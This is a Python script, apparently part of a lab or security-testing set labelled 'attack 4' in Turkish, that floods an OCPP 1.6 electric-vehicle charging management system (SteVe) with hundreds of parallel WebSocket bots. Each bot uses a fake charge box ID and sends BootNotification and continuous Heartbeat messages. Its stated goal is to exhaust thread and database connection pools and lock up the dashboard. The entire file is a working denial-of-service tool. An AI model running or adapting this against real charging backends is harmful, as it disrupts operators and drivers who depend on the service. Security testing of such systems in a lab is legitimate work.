"""
SALDIRI 4 - DoS Flood.

CSMS'e cok sayida sahte charge box ID'siyle paralel WebSocket baglantisi acar
ve her birinden BootNotification + Heartbeat firtinasi atar. Hedef: bag-handler
thread pool veya MySQL connection pool tukenmesi, dashboard'un yavaslamasi /
kilitlenmesi.

Kullanim:
    python attacks/dos_flood.py --target ws://localhost:8180/steve/websocket/CentralSystemService \
        --concurrency 200 --duration 60
"""
import argparse
import asyncio
import logging
import random
import string
import time

import websockets

from ocpp.v16 import ChargePoint as Cp
from ocpp.v16 import call

logging.basicConfig(level=logging.INFO, format="%(asctime)s [dos] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("dos")


def rand_id():
    return "FLOOD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))


async def one_bot(target, stop_at):
    cp_id = rand_id()
    url = f"{target.rstrip('/')}/{cp_id}"
    sent = 0
    try:
        async with websockets.connect(url, subprotocols=["ocpp1.6"]) as ws:
            cp = Cp(cp_id, ws)
            listen = asyncio.create_task(cp.start())
            try:
                await cp.call(call.BootNotification(charge_point_model="FLOOD", charge_point_vendor="ATTACKER"))
                sent += 1
                while time.time() < stop_at:
                    await cp.call(call.Heartbeat())
                    sent += 1
            finally:
                listen.cancel()
    except Exception as e:
        log.debug("bot %s died: %s", cp_id, e)
    return cp_id, sent


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="ws://localhost:8180/steve/websocket/CentralSystemService")
    ap.add_argument("--concurrency", type=int, default=100)
    ap.add_argument("--duration", type=int, default=30)
    args = ap.parse_args()

    log.warning("flood basliyor: %d bot * %d saniye", args.concurrency, args.duration)
    stop_at = time.time() + args.duration
    tasks = [asyncio.create_task(one_bot(args.target, stop_at)) for _ in range(args.concurrency)]
    results = await asyncio.gather(*tasks)
    total = sum(s for _, s in results)
    log.warning("flood bitti: %d toplam mesaj, %d bot", total, len(results))


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Kapaniyor.")
